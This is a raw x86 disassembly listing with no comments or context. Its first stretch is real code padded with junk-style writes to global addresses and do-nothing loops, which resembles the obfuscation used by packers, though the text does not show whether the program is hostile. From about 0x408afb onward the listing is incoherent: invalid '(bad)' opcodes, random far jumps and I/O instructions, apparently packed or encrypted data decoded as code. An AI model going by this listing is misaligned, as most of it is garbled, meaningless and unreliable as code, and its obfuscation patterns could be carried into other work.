  40891e:	mov    eax,DWORD PTR [ebp-0x14]
  408921:	mov    eax,DWORD PTR [eax+0x18]
  408924:	xor    DWORD PTR ds:0x426edd,0x1983
  40892e:	mov    DWORD PTR [ebp-0x24],eax
  408931:	adc    eax,ecx
  408933:	mov    eax,DWORD PTR [ebp-0x14]
  408936:	and    DWORD PTR ds:0x426f2d,0x0
  408940:	jmp    0x408952
  408945:	mov    ecx,DWORD PTR ds:0x426f2d
  40894b:	inc    ecx
  40894c:	mov    DWORD PTR ds:0x426f2d,ecx
  408952:	cmp    DWORD PTR ds:0x426f2d,0x12
  408959:	jae    0x4089a4
  40895f:	cmp    DWORD PTR ds:0x426f2d,0x5
  408966:	jbe    0x4089a4
  40896c:	jmp    0x408985
  408971:	push   0x426099
  408976:	push   DWORD PTR [ebp-0x28]
  408979:	push   DWORD PTR [ebp-0x1c]
  40897c:	push   DWORD PTR [ebp-0x10]
  40897f:	call   DWORD PTR ds:0x430a24
  408985:	cmp    DWORD PTR ds:0x426f2d,0x4
  40898c:	jne    0x40899f
  408992:	mov    ecx,DWORD PTR ds:0x426f2d
  408998:	inc    ecx
  408999:	mov    DWORD PTR ds:0x426f2d,ecx
  40899f:	jmp    0x408945
  4089a4:	mov    ecx,DWORD PTR [ebp+0x8]
  4089a7:	add    ecx,DWORD PTR [eax+0x20]
  4089aa:	and    DWORD PTR ds:0x426efd,0x4f65
  4089b4:	mov    DWORD PTR [ebp-0x2c],ecx
  4089b7:	mov    eax,DWORD PTR [ebp-0x14]
  4089ba:	dec    DWORD PTR ds:0x426ed9
  4089c0:	mov    ecx,DWORD PTR [ebp+0x8]
  4089c3:	and    DWORD PTR ds:0x426ef1,0x27b6
  4089cd:	add    ecx,DWORD PTR [eax+0x24]
  4089d0:	and    DWORD PTR ds:0x426f11,0x472e
  4089da:	mov    DWORD PTR [ebp-0x34],ecx
  4089dd:	mov    DWORD PTR ds:0x426f05,0x15
  4089e7:	cmp    DWORD PTR ds:0x426f05,0x0
  4089ee:	je     0x408a3a
  4089f4:	cmp    DWORD PTR ds:0x426f05,0x6
  4089fb:	jle    0x408a3a
  408a01:	jmp    0x408a0f
  408a06:	push   DWORD PTR [ebp-0x28]
  408a09:	call   DWORD PTR ds:0x430a28
  408a0f:	cmp    DWORD PTR ds:0x426f05,0x7
  408a16:	jne    0x408a2a
  408a1c:	xor    eax,eax
  408a1e:	xor    eax,DWORD PTR ds:0x426f05
  408a24:	dec    eax
  408a25:	mov    ds:0x426f05,eax
  408a2a:	mov    eax,ds:0x426f05
  408a2f:	dec    eax
  408a30:	mov    ds:0x426f05,eax
  408a35:	jmp    0x4089e7
  408a3a:	mov    eax,DWORD PTR [ebp-0x14]
  408a3d:	or     ecx,0x6017
  408a43:	mov    ecx,DWORD PTR [ebp+0x8]
  408a46:	sbb    DWORD PTR ds:0x426e9d,0x426f29
  408a50:	add    ecx,DWORD PTR [eax+0x1c]
  408a53:	mov    DWORD PTR ds:0x426e89,0x71b1
  408a5d:	mov    DWORD PTR [ebp-0x14],ecx
  408a60:	jmp    0x408ae1
  408a65:	mov    ecx,DWORD PTR ds:0x426ee1
  408a6b:	or     DWORD PTR ds:0x426f29,ecx
  408a71:	mov    eax,DWORD PTR [ebp-0x2c]
  408a74:	mov    ecx,DWORD PTR [ebp+0x8]
  408a77:	add    ecx,DWORD PTR [eax+ebx*4]
  408a7a:	add    eax,DWORD PTR ds:0x426f11
  408a80:	mov    DWORD PTR [ebp-0x28],ecx
  408a83:	mov    eax,DWORD PTR [ebp-0x4]
  408a86:	mov    ecx,DWORD PTR [ebp-0x28]
  408a89:	xor    eax,esi
  408a8b:	add    eax,edi
  408a8d:	mov    DWORD PTR ds:0x426eb5,0x5328
  408a97:	cmp    ecx,eax
  408a99:	je     0x408ae1
  408a9f:	mov    DWORD PTR ds:0x426f0d,0x30c
  408aa9:	jmp    0x408ad2
  408aae:	mov    eax,DWORD PTR [ebp-0x4]
  408ab1:	mov    ecx,DWORD PTR [ebp-0x8]
  408ab4:	xor    eax,esi
  408ab6:	add    eax,edi
  408ab8:	cmp    ecx,eax
  408aba:	mov    eax,DWORD PTR [ebp-0x4]
  408abd:	je     0x40aed1
  408ac3:	mov    ecx,DWORD PTR [ebp-0x30]
  408ac6:	xor    eax,esi
  408ac8:	add    eax,edi
  408aca:	cmp    ecx,eax
  408acc:	je     0x40aeda
  408ad2:	lea    eax,[ebp-0x8]
  408ad5:	push   eax
  408ad6:	push   DWORD PTR [ebp-0x28]
  408ad9:	push   DWORD PTR [ebp+0xc]
  408adc:	call   0x411c13
  408ae1:	mov    eax,DWORD PTR [ebp-0x4]
  408ae4:	mov    ecx,DWORD PTR [ebp-0x8]
  408ae7:	xor    eax,esi
  408ae9:	add    eax,edi
  408aeb:	cmp    ecx,eax
  408aed:	je     0x40aebd
  408af3:	mov    eax,DWORD PTR [ebp-0x34]
  408af6:	jmp    0x40aeab
  408afb:	cwde   
  408afc:	mov    esi,0x78f950e9
  408b01:	cmp    BYTE PTR [esi+0x12],al
  408b04:	mov    ds:0x532d29ff,eax
  408b09:	sar    BYTE PTR [edi+0x7b7be5ea],cl
  408b0f:	adc    ebx,DWORD PTR [ebx+edi*2+0x2a35277b]
  408b16:	cmc    
  408b17:	xchg   esi,eax
  408b18:	jno    0x408b03
  408b1a:	dec    ecx
  408b1b:	jmp    0xe8b9:0x225177d1
  408b22:	cmp    eax,0x7d34eabc
  408b27:	and    BYTE PTR [esi+0x340f76da],bh
  408b2d:	cmp    dl,ch
  408b2f:	push   cs
  408b30:	sub    edx,edx
  408b32:	sub    eax,0x22ddea5b
  408b37:	push   ebx
  408b38:	ins    DWORD PTR es:[edi],dx
  408b39:	fst    DWORD PTR [edi+0x4c3e9607]
  408b40:	sbb    DWORD PTR [ebp+0x30aa3db6],ebx
  408b46:	mov    ds:0xa304f1,al
  408b4b:	mov    DWORD PTR [ecx+ebx*2+0x61],ecx
  408b4f:	mov    ecx,DWORD PTR [eax+0x6b4596fc]
  408b55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b56:	xchg   ebx,eax
  408b57:	test   eax,0x7740619a
  408b5c:	jo     0x408b53
  408b5e:	mov    dl,0x7a
  408b60:	jmp    0x8047:0x7cc1901a
  408b67:	aad    0x25
  408b69:	ja     0x408b95
  408b6b:	std    
  408b6c:	sbb    al,0x10
  408b6e:	mov    BYTE PTR [esi],bl
  408b70:	(bad)  
  408b71:	retf   
  408b72:	lock xor ebp,esi
  408b75:	cmp    cl,ch
  408b77:	outs   dx,DWORD PTR ds:[esi]
  408b78:	xor    al,0x4c
  408b7a:	cli    
  408b7b:	shl    ebp,1
  408b7d:	and    ah,BYTE PTR [edx+eiz*2+0x60]
  408b81:	add    al,0x44
  408b83:	stc    
  408b84:	popf   
  408b85:	push   es
  408b86:	push   eax
  408b87:	sbb    edi,0xffffffbc
  408b8a:	push   eax
  408b8b:	ss cdq 
  408b8d:	sub    DWORD PTR [edx+0x43],ebx
  408b90:	test   al,0x7b
  408b92:	mov    eax,ds:0xa9f0ad9
  408b97:	push   0xc65141f1
  408b9c:	cmp    ebx,DWORD PTR [edx]
  408b9e:	imul   edx,esi,0xffffff87
  408ba1:	sbb    eax,DWORD PTR [ebp+eax*8-0x1c9f507d]
  408ba8:	in     al,0x41
  408baa:	xor    BYTE PTR [ecx],ch
  408bac:	push   ss
  408bad:	adc    cl,ch
  408baf:	hlt    
  408bb0:	fadd   st,st(5)
  408bb2:	xchg   ebp,eax
  408bb3:	leave  
  408bb4:	or     al,0xc2
  408bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bb7:	in     al,0xc
  408bb9:	in     al,dx
  408bba:	stos   DWORD PTR es:[edi],eax
  408bbb:	xor    DWORD PTR [edi-0x5856c971],esp
  408bc1:	test   al,0x5c
  408bc3:	test   al,0x60
  408bc5:	int    0x9c
  408bc7:	mov    cl,0x1b
  408bc9:	sub    ch,BYTE PTR [ebx+ebx*8+0x1f]
  408bcd:	in     al,dx
  408bce:	fldenv [ebx-0x11122f2f]
  408bd4:	leave  
  408bd5:	lock aaa 
  408bd7:	jmp    0x8cfe:0x1d32053a
  408bde:	cmp    cl,BYTE PTR [eax]
  408be0:	ret    0x577f
  408be3:	dec    edx
  408be4:	test   al,0x90
  408be6:	sbb    eax,0xeb1ccbf1
  408beb:	sti    
  408bec:	sub    bh,bl
  408bee:	dec    ebx
  408bef:	lahf   
  408bf0:	retf   0xf019
  408bf3:	loope  0x408c61
  408bf5:	dec    edi
  408bf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bf7:	(bad)  
  408bf8:	adc    dh,al
  408bfa:	xchg   edi,eax
  408bfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408bfc:	xchg   ebx,eax
  408bfd:	jge    0x408b98
  408bff:	jmp    edx
  408c01:	lahf   
  408c02:	cmp    ebp,0x28fc449
  408c08:	mov    edx,0x407477a2
  408c0d:	test   eax,0x5bd015ed
  408c12:	jnp    0x408b9d
  408c14:	leave  
  408c15:	sub    esi,ebx
  408c17:	pop    eax
  408c18:	imul   ah
  408c1a:	retf   0x7c
  408c1d:	sbb    esp,DWORD PTR [edx+0x6057e518]
  408c23:	mov    ebx,fs
  408c25:	xchg   esp,eax
  408c26:	icebp  
  408c27:	jbe    0x408bff
  408c29:	cwde   
  408c2a:	fstp   TBYTE PTR [ebp-0x7183041b]
  408c30:	sbb    BYTE PTR [edx-0x51f9322],cl
  408c36:	push   ecx
  408c37:	cmc    
  408c38:	(bad)  
  408c39:	js     0x408bff
  408c3b:	or     eax,ecx
  408c3d:	pop    edi
  408c3e:	stos   BYTE PTR es:[edi],al
  408c3f:	retf   
  408c40:	(bad)  
  408c41:	outs   dx,BYTE PTR ds:[esi]
  408c42:	pop    es
  408c43:	out    0x45,eax
  408c45:	pop    eax
  408c46:	sub    al,0x7
  408c48:	dec    esp
  408c49:	cmp    BYTE PTR [eax+0x30],0x9
  408c4d:	xchg   bl,bl
  408c4f:	or     BYTE PTR [ecx-0x54],bl
  408c52:	in     al,0x39
  408c54:	dec    esi
  408c55:	add    al,0x5e
  408c57:	inc    bp
  408c59:	jbe    0x408bf4
  408c5b:	and    esi,ecx
  408c5d:	out    dx,eax
  408c5e:	(bad)
  408c61:	ja     0x408c57
  408c63:	test   al,0x40
  408c65:	popf   
  408c66:	shl    DWORD PTR [ebp-0x367756ae],1
  408c6c:	jg     0x408bfa
  408c6e:	out    0x80,eax
  408c70:	xchg   edx,eax
  408c71:	int    0x6b
  408c73:	ins    BYTE PTR es:[edi],dx
  408c74:	es mov ecx,0x31a29e2c
  408c7a:	ins    BYTE PTR es:[edi],dx
  408c7b:	test   eax,0x3f631ef6
  408c80:	sub    BYTE PTR [edi-0x4f3711c6],0x0
  408c87:	pop    ebp
  408c88:	jge    0x408ca1
  408c8a:	jecxz  0x408d07
  408c8c:	xlat   BYTE PTR fs:[ebx]
  408c8e:	mov    BYTE PTR [ebx+ecx*4+0x5950f3d5],cl
  408c95:	imul   ecx,DWORD PTR [ebx],0xffffffa0
  408c98:	repnz test BYTE PTR [ebx+eax*8],cl
  408c9c:	lahf   
  408c9d:	sbb    bh,cl
  408c9f:	ret    
  408ca0:	out    0x1d,al
  408ca2:	sbb    edi,eax
  408ca4:	and    eax,0x44f63d18
  408ca9:	cmp    esp,DWORD PTR [eax+eax*2-0x5407d5f7]
  408cb0:	stos   DWORD PTR es:[edi],eax
  408cb1:	rcr    DWORD PTR [eax+0x28267287],0x69
  408cb8:	sbb    DWORD PTR ds:0x1b0f4e25,ebp
  408cbe:	push   cs
  408cbf:	xchg   esi,eax
  408cc0:	push   edx
  408cc1:	xor    al,0xdd
  408cc3:	jb     0x408c4f
  408cc5:	mov    WORD PTR [edi],gs
  408cc7:	mov    ebx,0x457b4c48
  408ccc:	sbb    eax,0x9b99ec18
  408cd1:	les    edi,FWORD PTR [ebp+0x50]
  408cd4:	loopne 0x408c61
  408cd6:	push   ebx
  408cd7:	push   esi
  408cd8:	push   edi
  408cd9:	jle    0x408d30
  408cdb:	jnp    0x408cb7
  408cdd:	sbb    BYTE PTR [edi-0x5b6f70de],bh
  408ce3:	mov    bh,0x13
  408ce5:	inc    ecx
  408ce6:	cmp    eax,0x773b17d8
  408ceb:	dec    edx
  408cec:	stos   BYTE PTR es:[edi],al
  408ced:	adc    ebx,eax
  408cef:	imul   edx,DWORD PTR [edx-0x48a79bc],0x504064e9
  408cf9:	ins    DWORD PTR es:[edi],dx
  408cfa:	cmp    eax,0xf0c5db47
  408cff:	cld    
  408d00:	add    al,BYTE PTR [eax-0xd]
  408d03:	icebp  
  408d04:	(bad)
  408d07:	add    dh,bl
  408d09:	adc    BYTE PTR [edx],cl
  408d0b:	not    DWORD PTR [ecx-0x5555e0ee]
  408d11:	sti    
  408d12:	rcr    bl,0xc2
  408d15:	out    dx,al
  408d16:	in     eax,0x53
  408d18:	push   eax
  408d19:	in     al,dx
  408d1a:	aad    0xa
  408d1c:	mov    WORD PTR [esi-0x21],?
  408d1f:	aas    
  408d20:	aaa    
  408d21:	and    eax,0x9647ff25
  408d26:	(bad)  
  408d27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d28:	fadd   DWORD PTR [edi-0x483a2bb4]
  408d2e:	pop    eax
  408d2f:	push   es
  408d30:	out    dx,eax
  408d31:	neg    BYTE PTR [ebp-0x44bab99]
  408d37:	xchg   esp,eax
  408d38:	xor    eax,0x6c4896ff
  408d3d:	xchg   DWORD PTR [ecx-0x33],eax
  408d40:	xchg   ebp,eax
  408d41:	push   edi
  408d42:	out    0xe0,al
  408d44:	test   ah,0x89
  408d47:	add    ebx,DWORD PTR [ecx]
  408d49:	mov    esp,0x29a4079d
  408d4e:	call   0x2ce687bc
  408d53:	push   0x1fcd553
  408d58:	mov    edx,0x48fed676
  408d5d:	mov    eax,0x1bed2464
  408d62:	and    esp,ebx
  408d64:	adc    ecx,edi
  408d66:	cdq    
  408d67:	cmc    
  408d68:	int3   
  408d69:	mov    edi,0x2a7b44a5
  408d6e:	xchg   edx,eax
  408d6f:	fs xor eax,0x8c8ce868
  408d75:	mov    edi,0xfe3fdae2
  408d7a:	xchg   edx,eax
  408d7b:	pop    esp
  408d7c:	ja     0x408d97
  408d7e:	or     ch,ch
  408d80:	sbb    al,0xe5
  408d82:	mov    esp,0x3fd128b2
  408d87:	retf   0x4f9a
  408d8a:	xlat   BYTE PTR ds:[ebx]
  408d8b:	daa    
  408d8c:	clc    
  408d8d:	loope  0x408d4a
  408d8f:	call   0x4867:0x65dd3e70
  408d96:	jb     0x408ded
  408d98:	ret    
  408d99:	loopne 0x408d88
  408d9b:	xchg   BYTE PTR [eax+0x36067d30],ch
  408da1:	sbb    BYTE PTR [eax],dl
  408da3:	mov    edx,0x7fcfaa27
  408da8:	mov    ah,0xd9
  408daa:	and    BYTE PTR [ebp+0x7d2dde54],bl
  408db0:	adc    al,0x82
  408db2:	ror    BYTE PTR [ecx-0x46777085],0xca
  408db9:	inc    ebp
  408dba:	add    DWORD PTR [ecx+0x67],ebx
  408dbd:	xor    al,cl
  408dbf:	push   esi
  408dc0:	scas   eax,DWORD PTR es:[edi]
  408dc1:	sbb    BYTE PTR [ecx-0x790d7dcd],dl
  408dc7:	xchg   BYTE PTR [eax-0x4ca480ef],dh
  408dcd:	xor    di,WORD PTR [ecx-0x37]
  408dd1:	jp     0x408d62
  408dd3:	fcmovnb st,st(0)
  408dd5:	(bad)  
  408dd6:	(bad)  
  408dd7:	mov    dh,0x53
  408dd9:	repnz outs dx,BYTE PTR ds:[esi]
  408ddb:	aaa    
  408ddc:	mov    esi,0xa91fd85b
  408de1:	push   ebx
  408de2:	inc    esi
  408de3:	test   al,0x7d
  408de5:	popa   
  408de6:	neg    DWORD PTR [edx-0x617dbce9]
  408dec:	pop    ds
  408ded:	fdivr  DWORD PTR [ecx+0x2539ba]
  408df3:	dec    eax
  408df4:	mov    cl,0x99
  408df6:	inc    esi
  408df7:	scas   al,BYTE PTR es:[edi]
  408df8:	inc    edi
  408df9:	aaa    
  408dfa:	cmp    dl,ch
  408dfc:	inc    edi
  408dfd:	lahf   
  408dfe:	test   DWORD PTR ds:[ebp+0x72faf7da],ebx
  408e05:	das    
  408e06:	push   cs
  408e07:	sub    DWORD PTR [edi+0x56],esi
  408e0a:	and    BYTE PTR [ebx],dh
  408e0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e0d:	icebp  
  408e0e:	push   0xb87adfb8
  408e13:	fcomi  st,st(2)
  408e15:	mov    dh,0xda
  408e17:	(bad)  
  408e18:	mov    esi,0x13e2a924
  408e1d:	mov    bl,0xa4
  408e1f:	scas   eax,DWORD PTR es:[edi]
  408e20:	pop    edx
  408e21:	dec    esp
  408e22:	sub    edi,DWORD PTR [edi+0x1b]
  408e25:	fcomp  st(3)
  408e27:	mov    esp,DWORD PTR [esi+0x3b]
  408e2a:	inc    ebx
  408e2b:	xor    eax,0x28ce2800
  408e30:	mov    bh,0x13
  408e32:	in     eax,0x47
  408e34:	inc    eax
  408e35:	inc    esp
  408e36:	fisubr WORD PTR [ebx+0x7e7f9274]
  408e3c:	inc    ebx
  408e3d:	stos   BYTE PTR es:[edi],al
  408e3e:	sbb    ah,BYTE PTR [esi-0x60b988c1]
  408e44:	pop    esp
  408e45:	sub    DWORD PTR [ebx-0x62538568],0xffffffc4
  408e4c:	adc    ebx,ecx
  408e4e:	shr    BYTE PTR [esi],0xca
  408e51:	xchg   edx,eax
  408e52:	(bad)  
  408e53:	mov    ?,WORD PTR [ecx+ebx*8+0x15]
  408e57:	nop
  408e58:	mov    BYTE PTR [ebp+ebp*8-0x32],cl
  408e5c:	xchg   esp,eax
  408e5d:	inc    eax
  408e5e:	clc    
  408e5f:	sub    DWORD PTR [ecx+0x6c],edi
  408e62:	loope  0x408e9e
  408e64:	icebp  
  408e65:	xor    al,0x4c
  408e67:	in     eax,0x65
  408e69:	push   edx
  408e6a:	js     0x408e9b
  408e6c:	inc    edx
  408e6d:	push   ebx
  408e6e:	or     BYTE PTR [bp+0x7830],dl
  408e73:	sbb    al,0x4d
  408e75:	mov    ds:0xa09955e8,al
  408e7a:	sub    al,0xc6
  408e7c:	and    BYTE PTR [ecx-0x368af1b4],bh
  408e82:	inc    esi
  408e83:	aaa    
  408e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e85:	or     BYTE PTR [esi-0x28fe22c6],dl
  408e8b:	and    eax,0x85cecd50
  408e90:	add    BYTE PTR [ebx-0x1b],cl
  408e93:	scas   eax,DWORD PTR es:[edi]
  408e94:	mov    esi,0xb7006ba6
  408e99:	push   edi
  408e9a:	aas    
  408e9b:	mov    eax,0x6a76f437
  408ea0:	aaa    
  408ea1:	sub    eax,0x7354512a
  408ea6:	mov    WORD PTR [edx],gs
  408ea8:	xchg   ecx,eax
  408ea9:	enter  0x6853,0x3d
  408ead:	inc    ecx
  408eae:	(bad)  
  408eaf:	retf   
  408eb0:	and    eax,0x7b6ca9ba
  408eb5:	xor    ah,BYTE PTR [eax]
  408eb7:	mov    DWORD PTR [eax+0x2f8f7555],ebp
  408ebd:	test   bl,ch
  408ebf:	in     al,0xbb
  408ec1:	jge    0x408eab
  408ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ec4:	lock ins DWORD PTR es:[edi],dx
  408ec6:	ins    BYTE PTR es:[edi],dx
  408ec7:	xchg   ebx,eax
  408ec8:	fisttp QWORD PTR [eax+0x1ee8c61f]
  408ece:	jb     0x408e7d
  408ed0:	jmp    0x6258:0x5605630d
  408ed7:	hlt    
  408ed8:	inc    ebx
  408ed9:	jno    0x408f07
  408edb:	in     al,dx
  408edc:	jbe    0x408e81
  408ede:	and    eax,edx
  408ee0:	jae    0x408eb0
  408ee2:	pop    es
  408ee3:	and    BYTE PTR [edx+0x64],ah
  408ee6:	in     al,dx
  408ee7:	loopne 0x408f3d
  408ee9:	jno    0x408f56
  408eeb:	mov    al,ds:0xc5afa4d
  408ef0:	jecxz  0x408f4d
  408ef2:	in     eax,0x74
  408ef4:	out    0xd9,al
  408ef6:	outs   dx,DWORD PTR ds:[esi]
  408ef7:	mov    es:0x514583e0,eax
  408efd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408efe:	mov    ds:0xdc1b327,al
  408f03:	mov    WORD PTR [edx-0x62],fs
  408f06:	inc    edi
  408f07:	leave  
  408f08:	push   ebx
  408f09:	das    
  408f0a:	(bad)  
  408f0b:	mov    al,ds:0x13e478fa
  408f10:	retf   
  408f11:	fidiv  DWORD PTR [edx-0x56]
  408f14:	sub    dl,dh
  408f16:	pop    esi
  408f17:	inc    eax
  408f18:	shr    DWORD PTR [ebx],0xc
  408f1b:	pusha  
  408f1c:	push   ebp
  408f1d:	fisttp DWORD PTR [edx]
  408f1f:	in     eax,0x32
  408f21:	xchg   esp,eax
  408f22:	mov    eax,0x5f37ec2e
  408f27:	into   
  408f28:	cmp    DWORD PTR [edx],0x1b
  408f2b:	and    edx,DWORD PTR [edx+0x0]
  408f2e:	mov    ds:0x57c3aafe,al
  408f33:	minps  xmm0,XMMWORD PTR [edx]
  408f36:	inc    ebp
  408f37:	jnp    0x408f10
  408f39:	rol    BYTE PTR [ebx+ecx*4-0x34b85e10],0x47
  408f41:	mov    ds:0x2f33b458,al
  408f46:	xchg   ebx,eax
  408f47:	cld    
  408f48:	pusha  
  408f49:	mov    BYTE PTR [ebx],al
  408f4b:	sub    eax,0xaa6f2440
  408f50:	hlt    
  408f51:	mov    ebp,0xb05f7b1e
  408f56:	es push ebx
  408f58:	jo     0x408f3c
  408f5a:	or     esp,ebp
  408f5c:	pop    es
  408f5d:	or     BYTE PTR [ebp+edi*8+0x72],0x60
  408f62:	mov    ch,0x1e
  408f64:	push   ds
  408f65:	les    ecx,FWORD PTR [edi+0x4cbef29b]
  408f6b:	les    edx,FWORD PTR [esi]
  408f6d:	xor    BYTE PTR [ebx+0x70],ch
  408f70:	leave  
  408f71:	mov    ebp,0xb2e7630d
  408f76:	sub    DWORD PTR [ebp-0x6e13ccc0],ebp
  408f7c:	int    0x31
  408f7e:	fs add dl,dh
  408f81:	xchg   ebp,eax
  408f82:	push   ss
  408f83:	jecxz  0x408fab
  408f85:	xchg   edx,eax
  408f86:	loop   0x408f8e
  408f88:	cmp    al,0x9
  408f8a:	push   edi
  408f8b:	retf   0x5770
  408f8e:	fmul   DWORD PTR [edx]
  408f90:	jno    0x408ffe
  408f92:	ins    DWORD PTR es:[edi],dx
  408f93:	jl     0x408ffd
  408f95:	sub    dl,al
  408f97:	xchg   ebx,eax
  408f98:	mov    edx,0x15b99b6e
  408f9d:	mov    eax,fs:0xd756a92b
  408fa3:	mov    eax,ds:0xa228f0cb
  408fa8:	xor    BYTE PTR [eax],bl
  408faa:	(bad)  
  408fab:	sti    
  408fac:	add    ecx,DWORD PTR [edx-0x530aef92]
  408fb2:	sbb    eax,DWORD PTR [esi]
  408fb4:	mov    ds:0x6c21dff,al
  408fb9:	or     DWORD PTR es:[ecx],ebp
  408fbc:	dec    esi
  408fbd:	fdivr  QWORD PTR [esi-0x38]
  408fc0:	mov    edx,0x8a8ebab0
  408fc5:	xor    al,0xb4
  408fc7:	inc    eax
  408fc8:	cli    
  408fc9:	xchg   ecx,eax
  408fca:	out    0xeb,eax
  408fcc:	ret    0xf665
  408fcf:	jbe    0x408fcf
  408fd1:	push   0x56aebe7c
  408fd6:	test   DWORD PTR [ebp-0x598db6de],edi
  408fdc:	cwde   
  408fdd:	sbb    cl,dl
  408fdf:	cmp    al,0xd0
  408fe1:	mov    esi,0xcddea540
  408fe6:	shl    edi,cl
  408fe8:	arpl   WORD PTR [esi],cx
  408fea:	mov    WORD PTR [eax+0x5300ae68],ds
  408ff0:	(bad)  
  408ff1:	dec    ebx
  408ff2:	shl    DWORD PTR [ecx],0x8d
  408ff5:	das    
  408ff6:	das    
  408ff7:	dec    ecx
  408ff8:	add    edx,esp
  408ffa:	int    0x23
  408ffc:	xor    edi,DWORD PTR [edi]
  408ffe:	lea    ebx,[eax+0x7ab780ac]
  409004:	bound  esi,QWORD PTR [edi+0x43]
  409007:	mov    eax,ds:0x54da4bc
  40900c:	int    0x5f
  40900e:	test   esi,ebp
  409010:	aad    0x5d
  409012:	cmp    dh,BYTE PTR [ebx-0x4bfaf38d]
  409018:	popa   
  409019:	adc    BYTE PTR [edx],dh
  40901b:	pop    ebp
  40901c:	addr16 mov al,ds:0x40d8
  409020:	and    eax,0x1a79dc1d
  409025:	ja     0x408fcd
  409027:	daa    
  409028:	mov    dh,al
  40902a:	mov    eax,esp
  40902c:	xchg   ebx,eax
  40902d:	sahf   
  40902e:	mov    dl,0xa0
  409030:	or     cl,al
  409032:	adc    al,0x47
  409034:	inc    ebp
  409035:	lea    ecx,ds:0x86619652
  40903b:	je     0x409062
  40903d:	push   es
  40903e:	xor    ch,0x87
  409041:	(bad)
  409044:	shr    DWORD PTR [esi-0x26],1
  409047:	mov    ebx,0x1e9cd8c4
  40904c:	shl    DWORD PTR [ebp-0x21],0xda
  409050:	pop    edx
  409051:	sub    eax,0xcb42bc23
  409056:	hlt    
  409057:	ins    BYTE PTR es:[edi],dx
  409058:	lods   eax,DWORD PTR ds:[esi]
  409059:	and    al,0x8
  40905b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40905c:	mov    eax,ds:0x87f35fa3
  409061:	inc    esi
  409062:	sub    BYTE PTR [edi+0x51],dh
  409065:	add    ecx,DWORD PTR [ebx+0x6c]
  409068:	pop    edi
  409069:	jmp    0x409009
  40906b:	fadd   st,st(3)
  40906d:	mov    ds:0x822213f7,eax
  409072:	in     eax,0x2d
  409074:	mov    edi,0xae5a007e
  409079:	xor    eax,0x32b9aa0a
  40907e:	out    dx,al
  40907f:	aas    
  409080:	or     al,0xa7
  409082:	pop    ebx
  409083:	mov    bh,0x83
  409085:	cmp    al,0x7a
  409087:	fmul   QWORD PTR ds:0x86859b37
  40908d:	dec    esi
  40908e:	and    dl,al
  409090:	push   esp
  409091:	ror    BYTE PTR [ebp-0x6a72755b],cl
  409097:	leave  
  409098:	mov    al,ds:0x333277e9
  40909d:	sub    DWORD PTR [esi+0x57f0543d],ecx
  4090a3:	shl    BYTE PTR [edi-0x30],cl
  4090a6:	ins    DWORD PTR es:[edi],dx
  4090a7:	(bad)  cs:[ebp+0x36]
  4090ab:	int3   
  4090ac:	(bad)  
  4090ad:	cld    
  4090ae:	shr    BYTE PTR [eax+0x626c902e],0xa5
  4090b5:	daa    
  4090b6:	dec    esi
  4090b7:	sbb    edx,DWORD PTR [eax+0x33df0cf8]
  4090bd:	fs mul ebp
  4090c0:	xchg   ecx,eax
  4090c1:	retf   0xe472
  4090c4:	call   0xbbfd:0x5a4871d
  4090cb:	mov    DWORD PTR [esi-0x6c],eax
  4090ce:	das    
  4090cf:	cdq    
  4090d0:	inc    esi
  4090d1:	mov    esp,0x6ad1f372
  4090d6:	jmp    0x806e93f6
  4090db:	pop    ebx
  4090dc:	adc    DWORD PTR [eax+edi*8+0x77108a5c],0x7c
  4090e4:	jle    0x40910b
  4090e6:	ds cmc 
  4090e8:	fimul  DWORD PTR [esi+ebp*1+0x20]
  4090ec:	mov    al,0xc1
  4090ee:	inc    edx
  4090ef:	repz bound ebx,QWORD PTR [edi+ebx*1]
  4090f3:	shr    BYTE PTR [eax-0x76],cl
  4090f6:	push   es
  4090f7:	cmp    DWORD PTR [esp+edx*4],edi
  4090fa:	jnp    0x4090c5
  4090fc:	mov    cl,0xf1
  4090fe:	mov    ds:0xd85d71b2,al
  409103:	scas   al,BYTE PTR es:[edi]
  409104:	adc    eax,0x50178f99
  409109:	(bad)  
  40910a:	dec    eax
  40910b:	xlat   BYTE PTR ds:[ebx]
  40910c:	jne    0x4090b4
  40910e:	and    DWORD PTR [ecx],ebx
  409110:	stos   BYTE PTR es:[edi],al
  409111:	cmp    eax,0xea38d1e9
  409116:	out    dx,eax
  409117:	jmp    0x71f1:0x51b664c9
  40911e:	das    
  40911f:	jmp    0x66b56d7a
  409124:	xchg   esp,eax
  409125:	aad    0xaa
  409127:	and    eax,0xed4f41dc
  40912c:	imul   eax,DWORD PTR [ecx],0x2b
  40912f:	mul    BYTE PTR [eax+0x40]
  409132:	in     al,dx
  409133:	mov    ds:0x30a6fd00,eax
  409138:	stos   DWORD PTR es:[edi],eax
  409139:	push   es
  40913a:	retf   0xef36
  40913d:	loopne 0x40911b
  40913f:	fld    QWORD PTR [eax+0xa]
  409142:	fcom   QWORD PTR [ecx-0x2f]
  409145:	push   ecx
  409146:	fdivr  st(5),st
  409148:	mov    DWORD PTR ds:0x6081c296,ebp
  40914e:	in     al,dx
  40914f:	and    dl,BYTE PTR [esi]
  409151:	inc    esi
  409152:	push   edx
  409153:	mov    DWORD PTR [ecx-0x5c],esp
  409156:	fld    TBYTE PTR [ecx+0x24]
  409159:	dec    DWORD PTR [eax-0xa220ce3]
  40915f:	dec    ecx
  409160:	fidivr WORD PTR [edi+ebp*8-0x62]
  409164:	sbb    edx,DWORD PTR ss:[eax+eax*8+0x42]
  409169:	push   0xffffffe7
  40916b:	mov    WORD PTR [esp+edi*8+0x3839bd95],fs
  409172:	add    esp,DWORD PTR [ebp-0x4d2e6be0]
  409178:	cdq    
  409179:	jns    0x4091d6
  40917b:	inc    eax
  40917c:	(bad)  
  40917d:	retf   
  40917e:	pop    esp
  40917f:	mov    dh,0x9e
  409181:	xlat   BYTE PTR ds:[ebx]
  409182:	rol    BYTE PTR [ebp-0x5d],0x29
  409186:	stos   BYTE PTR es:[edi],al
